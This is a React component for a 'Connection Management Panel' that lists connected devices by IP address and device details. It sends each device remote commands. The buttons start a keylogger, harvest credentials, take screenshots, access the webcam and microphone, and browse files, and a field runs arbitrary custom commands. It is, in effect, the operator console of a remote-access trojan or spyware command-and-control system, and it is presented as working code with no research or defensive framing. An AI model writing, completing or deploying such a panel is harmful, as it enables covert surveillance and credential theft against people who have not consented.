import React, { useState, useEffect } from 'react';
import axios from 'axios';
import { Link } from 'react-router-dom';

const AdminPanel = () => {
  const [connections, setConnections] = useState([]);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState(null);
  const [selectedConnection, setSelectedConnection] = useState(null);

  useEffect(() => {
    fetchConnections();
    // Set up auto-refresh every 30 seconds
    const interval = setInterval(fetchConnections, 30000);
    return () => clearInterval(interval);
  }, []);

  const fetchConnections = async () => {
    try {
      setLoading(true);
      const response = await axios.get('/api/connections');
      setConnections(response.data);
      setError(null);
    } catch (err) {
      setError('Failed to fetch connections. Please try again later.');
      console.error('Error fetching connections:', err);
    } finally {
      setLoading(false);
    }
  };

  const formatDate = (dateString) => {
    const date = new Date(dateString);
    return date.toLocaleString();
  };

  const handleConnectionSelect = (connection) => {
    setSelectedConnection(connection);
  };

  const sendCommand = async (command) => {
    if (!selectedConnection) return;
    
    try {
      await axios.post(`/api/command/${selectedConnection.id}`, { command });
      alert('Command sent successfully');
    } catch (err) {
      alert('Failed to send command');
      console.error('Error sending command:', err);
    }
  };

  return (
    <div className="admin-container">
      <div className="admin-header">
        <h1 className="admin-title">Connection Management Panel</h1>
        <div className="admin-actions">
          <Link to="/admin/credentials" className="cta-button">
            View Credentials
          </Link>
          <button 
            className="cta-button" 
            onClick={fetchConnections}
          >
            Refresh
          </button>
        </div>
      </div>

      {loading && <p>Loading connections...</p>}
      
      {error && <p className="error-message">{error}</p>}
      
      {!loading && !error && connections.length === 0 && (
        <p>No connections found. Waiting for users to connect.</p>
      )}

      {connections.length > 0 && (
        <div className="connections-wrapper">
          <h2>Active Connections ({connections.length})</h2>
          <table className="connections-table">
            <thead>
              <tr>
                <th>ID</th>
                <th>IP Address</th>
                <th>Device</th>
                <th>Connected At</th>
                <th>Status</th>
                <th>Action</th>
              </tr>
            </thead>
            <tbody>
              {connections.map(connection => {
                const deviceInfo = connection.device_info ? JSON.parse(connection.device_info) : {};
                
                return (
                  <tr key={connection.id}>
                    <td>{connection.id}</td>
                    <td>{connection.ip}</td>
                    <td>
                      {deviceInfo.platform || 'Unknown'} / 
                      {deviceInfo.connection && deviceInfo.connection !== 'Not available' 
                        ? ` ${deviceInfo.connection.effectiveType}` 
                        : ' Unknown'}
                    </td>
                    <td>{formatDate(connection.timestamp)}</td>
                    <td>
                      <span className={`status-${connection.status}`}>
                        {connection.status}
                      </span>
                    </td>
                    <td>
                      <button 
                        className="cta-button"
                        onClick={() => handleConnectionSelect(connection)}
                      >
                        Control
                      </button>
                    </td>
                  </tr>
                );
              })}
            </tbody>
          </table>
        </div>
      )}

      {selectedConnection && (
        <div className="connection-details">
          <h2>Connection Details</h2>
          <div className="details-grid">
            <div>
              <h3>Basic Info</h3>
              <p><strong>ID:</strong> {selectedConnection.id}</p>
              <p><strong>IP:</strong> {selectedConnection.ip}</p>
              <p><strong>Connected:</strong> {formatDate(selectedConnection.timestamp)}</p>
              <p><strong>Status:</strong> {selectedConnection.status}</p>
            </div>
            
            <div>
              <h3>Device Information</h3>
              <pre>{JSON.stringify(JSON.parse(selectedConnection.device_info || '{}'), null, 2)}</pre>
            </div>
            
            <div>
              <h3>Remote Control</h3>
              <div className="command-group">
                <button onClick={() => sendCommand('screenshot')}>Take Screenshot</button>
                <button onClick={() => sendCommand('keylog_start')}>Start Keylogger</button>
                <button onClick={() => sendCommand('harvest_credentials')}>Harvest Credentials</button>
                <button onClick={() => sendCommand('webcam')}>Access Webcam</button>
                <button onClick={() => sendCommand('mic_record')}>Record Microphone</button>
                <button onClick={() => sendCommand('files')}>Access Files</button>
              </div>
              
              <h4>Custom Command</h4>
              <div className="custom-command">
                <input type="text" id="custom-command" placeholder="Enter custom command..." />
                <button onClick={() => {
                  const command = document.getElementById('custom-command').value;
                  if (command) sendCommand(command);
                }}>
                  Execute
                </button>
              </div>
            </div>
          </div>
        </div>
      )}
    </div>
  );
};

export default AdminPanel; 